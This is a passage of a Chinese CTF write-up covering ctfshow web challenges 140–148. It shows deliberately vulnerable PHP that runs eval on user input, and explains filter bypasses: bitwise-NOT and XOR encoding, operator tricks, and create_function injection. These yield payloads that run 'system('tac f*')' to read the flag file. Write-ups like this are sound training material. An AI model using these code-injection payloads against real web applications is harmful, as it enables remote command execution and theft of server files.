class="line">requests.get(url,timeout=(<span class="number">2.5</span>,<span class="number">2.5</span>))<span class="comment">#time()第一个参数是响应时间，第二个是读取时间</span></span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    result=result+n</span><br><span class="line">    <span class="built_in">print</span>(result)</span><br><span class="line">    <span class="keyword">break</span></span><br></pre></td></tr></table></figure><h3 id="web140——松散比较"><a href="#web140——松散比较" class="headerlink" title="web140——松散比较=="></a>web140——松散比较==</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;f1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;f2&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$f1</span> = (String)<span class="variable">$_POST</span>[<span class="string">&#x27;f1&#x27;</span>];</span><br><span class="line">    <span class="variable">$f2</span> = (String)<span class="variable">$_POST</span>[<span class="string">&#x27;f2&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^[a-z0-9]+$/&#x27;</span>, <span class="variable">$f1</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^[a-z0-9]+$/&#x27;</span>, <span class="variable">$f2</span>))&#123;</span><br><span class="line">            <span class="variable">$code</span> = <span class="keyword">eval</span>(<span class="string">&quot;return <span class="subst">$f1</span>(<span class="subst">$f2</span>());&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$code</span>) == <span class="string">&#x27;ctfshow&#x27;</span>)&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>查看<a href="https://www.php.net/manual/zh/types.comparisons.php">PHP类型比较表</a> 可发现</p><p><strong><code>0==“字符串”</code> 返回的是TRUE</strong></p><p>intval会将非数字字符转换为0，也就是说 <code>intval(&#39;a&#39;)==0 intval(&#39;.&#39;)==0 intval(&#39;/&#39;)==0</code></p><p>payload：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">phpinfo</span>())</span><br><span class="line"><span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">sleep</span>())</span><br><span class="line"><span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">md5</span>())</span><br><span class="line"><span class="title function_ invoke__">current</span>(localeconv)</span><br><span class="line"><span class="title function_ invoke__">sha1</span>(<span class="title function_ invoke__">getcwd</span>())     因为/<span class="keyword">var</span>/www/html md5后开头的数字所以我们改用sha1</span><br></pre></td></tr></table></figure><h3 id="web141——取反"><a href="#web141——取反" class="headerlink" title="web141——取反~"></a>web141——取反~</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$v1</span> = (String)<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    <span class="variable">$v2</span> = (String)<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line">    <span class="variable">$v3</span> = (String)<span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v1</span>) &amp;&amp; <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v2</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^\W+$/&#x27;</span>, <span class="variable">$v3</span>))&#123;</span><br><span class="line">            <span class="variable">$code</span> =  <span class="keyword">eval</span>(<span class="string">&quot;return <span class="subst">$v1</span><span class="subst">$v3</span><span class="subst">$v2</span>;&quot;</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$v1</span><span class="subst">$v3</span><span class="subst">$v2</span> = &quot;</span>.<span class="variable">$code</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p><a href="https://blog.csdn.net/miuzzx/article/details/109143413">绕过无字母数字的方法参考yu师傅的脚本</a>：这里直接利用取反脚本</p><p>绕过return的方式：<br>php中有个有意思的地方，数字是可以和命令进行一些运算的，例如 <code>1-phpinfo();</code>结合减号是可以执行phpinfo()命令的。（不一定是减号，还有加、乘、除号，若用加号。要用<code>+</code>，要进行URL编码，这是个特殊字符，不进行编码会当作空格）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">system(tac f*);</span><br><span class="line">经过取反处理</span><br><span class="line">(~%8C%86%8C%8B%9A%92)(~%8B%9E%9C%DF%99%D5);</span><br><span class="line">payload：</span><br><span class="line">?v1=1&amp;v3=-(~%8C%86%8C%8B%9A%92)(~%8B%9E%9C%DF%99%D5);-&amp;v2=1</span><br></pre></td></tr></table></figure><p>运行完直接报毒，关闭杀软后食用，此处会先进行url解码再匹配</p><h3 id="web142"><a href="#web142" class="headerlink" title="web142"></a>web142</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$v1</span> = (String)<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v1</span>))&#123;</span><br><span class="line">        <span class="variable">$d</span> = (<span class="keyword">int</span>)(<span class="variable">$v1</span> * <span class="number">0x36d</span> * <span class="number">0x36d</span> * <span class="number">0x36d</span> * <span class="number">0x36d</span> * <span class="number">0x36d</span>);</span><br><span class="line">        <span class="title function_ invoke__">sleep</span>(<span class="variable">$d</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">payload:</span><br><span class="line">?v1=<span class="number">0</span>   八进制</span><br><span class="line">?v1=<span class="number">0x0</span><span class="number">16</span>进制</span><br><span class="line">?v1=<span class="number">0e123</span>科学计数法</span><br></pre></td></tr></table></figure><h3 id="web143——异或"><a href="#web143——异或" class="headerlink" title="web143——异或^"></a>web143——异或^</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$v1</span> = (String)<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    <span class="variable">$v2</span> = (String)<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line">    <span class="variable">$v3</span> = (String)<span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v1</span>) &amp;&amp; <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v2</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[a-z]|[0-9]|\+|\-|\.|\_|\||\$|\&#123;|\&#125;|\~|\%|\&amp;|\;/i&#x27;</span>, <span class="variable">$v3</span>))&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&#x27;get out hacker!&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$code</span> =  <span class="keyword">eval</span>(<span class="string">&quot;return <span class="subst">$v1</span><span class="subst">$v3</span><span class="subst">$v2</span>;&quot;</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$v1</span><span class="subst">$v3</span><span class="subst">$v2</span> = &quot;</span>.<span class="variable">$code</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>为了在return中保证运算，我们需要用*来实现</p><h3 id="web144——取反-配合±号"><a href="#web144——取反-配合±号" class="headerlink" title="web144——取反~配合±号"></a>web144——取反~配合±号</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$v1</span> = (String)<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    <span class="variable">$v2</span> = (String)<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line">    <span class="variable">$v3</span> = (String)<span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v1</span>) &amp;&amp; <span class="title function_ invoke__">check</span>(<span class="variable">$v3</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^\W+$/&#x27;</span>, <span class="variable">$v2</span>))&#123;</span><br><span class="line">            <span class="variable">$code</span> =  <span class="keyword">eval</span>(<span class="string">&quot;return <span class="subst">$v1</span><span class="subst">$v3</span><span class="subst">$v2</span>;&quot;</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$v1</span><span class="subst">$v3</span><span class="subst">$v2</span> = &quot;</span>.<span class="variable">$code</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">strlen</span>(<span class="variable">$str</span>)===<span class="number">1</span>?<span class="literal">true</span>:<span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="web145——三目运算符的妙用"><a href="#web145——三目运算符的妙用" class="headerlink" title="web145——三目运算符的妙用?:"></a>web145——三目运算符的妙用?:</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$v1</span> = (String)<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    <span class="variable">$v2</span> = (String)<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line">    <span class="variable">$v3</span> = (String)<span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v1</span>) &amp;&amp; <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v2</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[a-z]|[0-9]|\@|\!|\+|\-|\.|\_|\$|\&#125;|\%|\&amp;|\;|\&lt;|\&gt;|\*|\/|\^|\#|\&quot;/i&#x27;</span>, <span class="variable">$v3</span>))&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&#x27;get out hacker!&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$code</span> =  <span class="keyword">eval</span>(<span class="string">&quot;return <span class="subst">$v1</span><span class="subst">$v3</span><span class="subst">$v2</span>;&quot;</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$v1</span><span class="subst">$v3</span><span class="subst">$v2</span> = &quot;</span>.<span class="variable">$code</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>测试：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">eval</span>(<span class="string">&quot;return 1?phpinfo():1;&quot;</span>);</span><br></pre></td></tr></table></figure><p>这是可以运行出来的</p><h3 id="web146——等号和位运算"><a href="#web146——等号和位运算" class="headerlink" title="web146——等号和位运算"></a>web146——等号和位运算</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">hlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$v1</span> = (String)<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    <span class="variable">$v2</span> = (String)<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line">    <span class="variable">$v3</span> = (String)<span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v1</span>) &amp;&amp; <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v2</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[a-z]|[0-9]|\@|\!|\:|\+|\-|\.|\_|\$|\&#125;|\%|\&amp;|\;|\&lt;|\&gt;|\*|\/|\^|\#|\&quot;/i&#x27;</span>, <span class="variable">$v3</span>))&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&#x27;get out hacker!&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$code</span> =  <span class="keyword">eval</span>(<span class="string">&quot;return <span class="subst">$v1</span><span class="subst">$v3</span><span class="subst">$v2</span>;&quot;</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$v1</span><span class="subst">$v3</span><span class="subst">$v2</span> = &quot;</span>.<span class="variable">$code</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>又增加了分号的过滤，所以我们没法用三目运算符了，这时候想到了等号和位运算符</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">eval</span>(<span class="string">&quot;return 1==phpinfo()||1;&quot;</span>);</span><br></pre></td></tr></table></figure><h3 id="web147——代码注入"><a href="#web147——代码注入" class="headerlink" title="web147——代码注入"></a>web147——代码注入</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;ctf&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$ctfshow</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;ctf&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^[a-z0-9_]*$/isD&#x27;</span>,<span class="variable">$ctfshow</span>)) &#123;</span><br><span class="line">        <span class="variable">$ctfshow</span>(<span class="string">&#x27;&#x27;</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;show&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>分析正则表达式：</strong><br><code>/i</code>不区分大小写<br><code>/s</code>匹配任何不可见字符，包括空格、制表符、换页符等等，等价于<code>[\f\n\r\t\v]</code><br><code>/D</code>如果使用$限制结尾字符,则不允许结尾有换行</p><p><strong>create_function:</strong></p><p><a href="https://paper.seebug.org/755/">参考这篇文章第一道题</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">create_function</span>()主要用来创建匿名函数,有时候匿名函数可以发挥它的作用。</span><br><span class="line"></span><br><span class="line"><span class="keyword">string</span> <span class="title function_ invoke__">create_function</span>    ( <span class="keyword">string</span> <span class="variable">$args</span>   , <span class="keyword">string</span> <span class="variable">$code</span>   )</span><br><span class="line"></span><br><span class="line"><span class="keyword">string</span> <span class="variable">$args</span> 参数部分</span><br><span class="line"><span class="keyword">string</span> <span class="variable">$code</span> 方法代码部分</span><br><span class="line"></span><br><span class="line">举例：</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">create_function</span>(<span class="string">&#x27;$name&#x27;</span>,<span class="string">&#x27;echo $fname.&quot;Zhang&quot;&#x27;</span>)</span><br><span class="line">类似于：</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fT</span>(<span class="params"><span class="variable">$name</span></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="variable">$fname</span>.<span class="string">&quot;Zhang&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>绕过匹配的方式很简单：需要在开头或者结尾找到一一个字符同时不影响函数的正常调用</p><p>现场制作一个fuzz用的字典：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$myfile</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&quot;ascii.txt&quot;</span>,<span class="string">&quot;w&quot;</span>);</span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>;<span class="variable">$i</span> &lt; <span class="number">129</span>; <span class="variable">$i</span>++)&#123;</span><br><span class="line"><span class="variable">$a</span> = <span class="title function_ invoke__">chr</span>(<span class="variable">$i</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[a-z0-9]/isD&#x27;</span>,<span class="variable">$a</span>))&#123;</span><br><span class="line"><span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[a-z0-9]/isD&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$a</span>);</span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">urlencode</span>(<span class="variable">$a</span>).<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="comment">//$c = &quot;未编码：&quot;.$a.&quot;经过编码：&quot;.$b.&quot;\n&quot;;</span></span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(<span class="variable">$myfile</span>,<span class="variable">$b</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//echo $c;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">fclose</span>(<span class="variable">$myfile</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>然后复制本题目代码本地搭建：开始寻找命中字符</p><p>先构造payload：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">create_function</span>(<span class="string">&#x27;&#x27;</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;show&#x27;</span>])</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">hacker</span>(<span class="params"><span class="variable">$hackername</span></span>) </span>&#123;</span><br><span class="line">&#125;<span class="keyword">echo</span> <span class="string">&quot;yn8rt&quot;</span>;<span class="comment">//</span></span><br><span class="line">&#125;</span><br><span class="line">所以：</span><br><span class="line"><span class="title function_ invoke__">create_function</span>(<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#125;echo &quot;yn8rt&quot;;//&#x27;</span>)</span><br><span class="line">payload:</span><br><span class="line">?show=&#125;<span class="keyword">echo</span> <span class="string">&quot;yn8rt&quot;</span>;<span class="comment">//</span></span><br><span class="line">post:ctf=%create_function</span><br></pre></td></tr></table></figure><p>开始fuzz：</p><p><img src="https://img-blog.csdnimg.cn/img_convert/9d8148dd7353af8c807d7e233b2a3037.png" alt=""></p><p>payload：</p><p><code>?show=&#125;system(&#39;tac f*&#39;);//</code></p><p><code>ctf=%5ccreate_function</code></p><p>而事实上%5c就是<code>\</code>：</p><p>在PHP的命名空间默认为\，所有的函数和类都在\这个命名空间中，如果直接写函数名function_name()调用，调用的时候其实相当于写了一个相对路径；而如果写\function_name()这样调用函数，则其实是写了一个绝对路径。如果你在其他namespace里调用系统类，就必须写绝对路径这种写法</p><h3 id="web148"><a href="#web148" class="headerlink" title="web148"></a>web148</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$code</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[A-Za-z0-9_\%\\|\~\&#x27;\,\.\:\@\&amp;\*\+\- ]+/&quot;</span>,<span class="variable">$code</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;error&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    @<span class="keyword">eval</span>(<span class="variable">$code</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_ctfshow_fl0g</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>中文变量：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">code=$哈=&quot;`&#123;&#123;&#123;&quot;^&quot;?&lt;&gt;/&quot;;$&#123;$哈&#125;[哼]($&#123;$哈&#125;[嗯]);&amp;哼=system&amp;嗯=tac f*</span><br><span 